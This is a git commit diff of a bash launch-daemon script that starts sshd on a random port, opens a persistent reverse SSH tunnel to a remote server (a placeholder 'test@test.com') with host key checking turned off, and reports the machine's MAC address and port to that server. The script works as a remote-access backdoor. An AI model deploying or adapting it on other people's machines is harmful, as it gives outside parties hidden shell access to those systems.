3a447af102f42d4bc4a5f6d5a54f5beb1375b786
mn <39255541+margielamadman@users.noreply.github.com>
2018-11-26 20:42:33 -0800

    script rewrite

--- launch-daemon/iron_biscotti.sh
+++ launch-daemon/iron_biscotti.sh
@@ -1,13 +1,18 @@
 #!/bin/bash
 
-SSHD_COMMAND="/usr/sbin/sshd -p $SSHD_PORT"
 SSHD_STATUS=0
+SSH_STATUS=1
+TUNNELSERVER="test@test.com"
 
+
+function tunnel_port() {
+  SSH_PORT="$(ssh $TUNNELSERVER "echo $(python -c 'import socket; s = socket.socket(); s.bind(("", 0)); print s.getsockname()[1]; s.close()')")"
+  SSH_COMMAND="ssh -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -f -N -R $SSH_PORT:localhost:$SSHD_PORT $TUNNELSERVER"
+}
 
 function find_port() {
   SSHD_PORT=$(python -c 'import socket; s = socket.socket(); s.bind(("", 0)); print s.getsockname()[1]; s.close()')
   SSHD_COMMAND="/usr/sbin/sshd -p $SSHD_PORT"
-  SSH_COMMAND="./tunnel.sh $SSHD_PORT"
 }
 
 function check_sshd() {
@@ -22,18 +27,24 @@ function check_sshd() {
 function check_ssh() {
   SSH_PID=$(ps -ax | grep "$SSH_COMMAND" | grep -v "grep" | awk '{print $1}')
   if [ "$SSH_PID" == "" ]; then
-    # Exits with status code '1' if the connection was not established
+    echo restarting ssh
     $SSH_COMMAND
     SSH_STATUS=$?
-    echo "Status Code: $SSH_STATUS"
   fi
 }
 
-while true; do
-  find_port
-  check_sshd
-  if [ "$SSHD_STATUS" == "0" ]; then
+function add_listing() {
+  MAC_ADDR=$(ifconfig en0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
+  REMOTE_CMD="./manageports.sh $MAC_ADDR $SSH_PORT"
+  ssh $TUNNELSERVER $REMOTE_CMD
+}
+
+find_port
+check_sshd
+if [ "$SSHD_STATUS" == "0" ]; then
+  until [ "$SSH_STATUS" == "0" ]; do
+    tunnel_port
     check_ssh
-  fi
-  sleep 15
-done
+  done
+  add_listing
+fi
